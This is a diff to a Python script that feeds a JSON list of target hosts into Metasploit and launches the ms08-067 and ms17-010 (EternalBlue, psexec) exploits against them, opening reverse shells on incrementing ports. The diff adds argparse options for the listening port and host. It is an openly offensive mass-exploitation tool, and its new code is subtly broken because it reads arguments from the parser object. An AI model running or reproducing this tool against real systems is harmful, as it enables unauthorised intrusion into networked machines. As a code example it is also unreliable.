@@ -1,7 +1,7 @@
 import os
 import json
 import subprocess
-import sys
+import argparse
 
 _exploit_dict_structure = ['ms08-067', 'ms17-010-psexec', 'ms17-010-eternalblue']
 
@@ -17,7 +17,7 @@ def handle_exploitation(exploit_dict, start_port=4444, lhost=None):
     THIS METHOD DOES NOT RETURN.
     """
 
-    port = start_port  # Necessary because this becomes multithreaded
+    port = start_port  # Necessary because this becomes multithreaded when Metasploit takes over
     commands = []  # List of commands to execute in metasploit
 
     assert len(exploit_dict) == len(_exploit_dict_structure)
@@ -68,12 +68,14 @@ def handle_exploitation(exploit_dict, start_port=4444, lhost=None):
     os.execv('/usr/bin/msfconsole', ['msfconsole', '-x', '; '.join(commands)])
 
 if __name__ == '__main__':
-    if len(sys.argv) != 2:
-        print('Usage: {0} <exploitable host json filename>'.format(sys.argv[0]))
-        exit()
+    parser = argparse.ArgumentParser(description='Exploit and open shells on hosts denoted in the input JSON file.')
+    parser.add_argument('file', help='a JSON format file of exploit:hosts to run')
+    parser.add_argument('--port', '-p', help='port to start reverse shells from, each host requires one port, incremented singly', default=4444)
+    parser.add_argument('--lhost', '-lh', help='host to try to bind the listening sockets to, if unsupplied metasploit will try to guess', default=None)
+    args = parser.parse_args()
 
     exploit_dict = None
-    with open(sys.argv[1], 'r') as f:
+    with open(parser.file, 'r') as f:
         exploit_dict = json.load(f)
 
-    handle_exploitation(exploit_dict)
+    handle_exploitation(exploit_dict, parser.port, parser.lhost)
